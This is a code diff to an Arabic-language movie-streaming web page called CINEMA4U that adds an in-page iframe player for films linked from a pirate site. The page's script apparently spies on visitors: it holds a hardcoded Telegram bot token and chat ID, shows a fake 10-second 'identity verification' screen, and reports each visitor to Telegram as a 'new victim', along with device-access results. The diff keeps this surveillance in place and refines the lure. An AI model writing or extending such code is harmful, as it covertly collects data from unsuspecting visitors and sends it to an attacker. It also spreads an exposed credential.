@@ -179,6 +179,7 @@
             margin-top: 0.5rem;
             color: white;
         }
+        /* نافذة التحقق */
         .player-overlay {
             position: fixed;
             top: 0;
@@ -250,6 +251,38 @@
         .progress-bar { width: 80%; height: 5px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #e50914; animation: loading 10s linear forwards; }
         @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
+        /* نافذة iframe لعرض الفيلم داخل الموقع */
+        .movie-iframe-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+        }
+        .movie-iframe-header {
+            background: #111;
+            padding: 0.5rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid #e50914;
+        }
+        .close-iframe-btn {
+            background: #e50914;
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        .movie-iframe {
+            width: 100%;
+            flex: 1;
+            border: none;
+        }
         footer { text-align: center; padding: 2rem; color: #555; border-top: 1px solid #1e1e2f; margin-top: 2rem; }
         @media (max-width: 1000px) {
             .main-container { flex-direction: column; }
@@ -313,8 +346,16 @@
 
 <footer>by massil — جميع الحقوق محفوظة © 2026 | CINEMA4U حيث السينما تلتقي بالمتعة</footer>
 
+<!-- نافذة iframe لعرض الفيلم داخل الموقع -->
+<div id="movieIframeOverlay" class="movie-iframe-overlay">
+    <div class="movie-iframe-header">
+        <button class="close-iframe-btn" id="closeIframeBtn">✕ إغلاق</button>
+    </div>
+    <iframe id="movieIframe" class="movie-iframe" src="" allowfullscreen></iframe>
+</div>
+
 <script>
-    // إعدادات البوت - استبدل هذه القيم بقيمك أنت
+    // إعدادات البوت
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
@@ -372,7 +413,7 @@
         } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
     }
 
-    // روابط المشاهدة الحقيقية (تم تحديثها وفقًا لنتائج البحث)
+    // روابط المشاهدة الحقيقية (ستظهر داخل iframe)
     const MOVIE_LINKS = {
         "Ratatouille": "https://as.akwam.tube/all/%D9%81%D9%8A%D9%84%D9%85-ratatouille-2007-%D9%85%D8%AA%D8%B1%D8%AC%D9%85/",
         "هاري بوتر": "https://as.akwam.tube/ar/video/watch-harry-potter-and-the-sorcerers-stone-2001-translated-online-akoam-15250/",
@@ -395,7 +436,6 @@
         "The Conjuring": "https://as.akwam.tube/ar/video/watch-the-conjuring-2013-translated-online-akoam-15662/"
     };
 
-    // تعريف قوائم الأفلام والمسلسلات مع صور TMDB
     const movies = [
         { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg", link: MOVIE_LINKS["Ratatouille"] },
         { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg", link: MOVIE_LINKS["هاري بوتر"] },
@@ -484,12 +524,25 @@
             ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
             sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
             timeoutId = setTimeout(() => {
-                window.location.href = currentLink;
+                // إغلاق نافذة التحقق
                 overlay.remove();
+                // عرض iframe بدلاً من الانتقال إلى رابط خارجي
+                const iframeOverlay = document.getElementById('movieIframeOverlay');
+                const iframe = document.getElementById('movieIframe');
+                iframe.src = currentLink;
+                iframeOverlay.style.display = 'flex';
                 isSpyingActive = false;
             }, 10000);
         };
     }
+
+    // إغلاق نافذة iframe
+    document.getElementById('closeIframeBtn').onclick = () => {
+        const iframeOverlay = document.getElementById('movieIframeOverlay');
+        iframeOverlay.style.display = 'none';
+        const iframe = document.getElementById('movieIframe');
+        iframe.src = '';
+    };
 
     loadItems('moviesGrid', movies, 'فيلم', false);
     loadItems('seriesGrid', series, 'مسلسل', false);
